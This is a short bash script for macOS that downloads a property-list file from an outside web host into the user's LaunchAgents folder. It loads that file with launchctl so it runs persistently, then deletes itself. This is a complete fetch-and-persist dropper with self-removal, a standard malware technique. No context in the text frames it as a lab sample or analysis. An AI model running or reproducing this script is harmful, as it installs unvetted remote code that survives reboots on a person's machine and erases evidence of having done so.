#!/bin/bash
curl -o /Users/$USER/Library/LaunchAgents/evalbug.plist http://blog.evalbug.com/uploads/evalbug.plist
launchctl load /Users/$USER/Library/LaunchAgents/evalbug.plist
rm -- "$0"
exit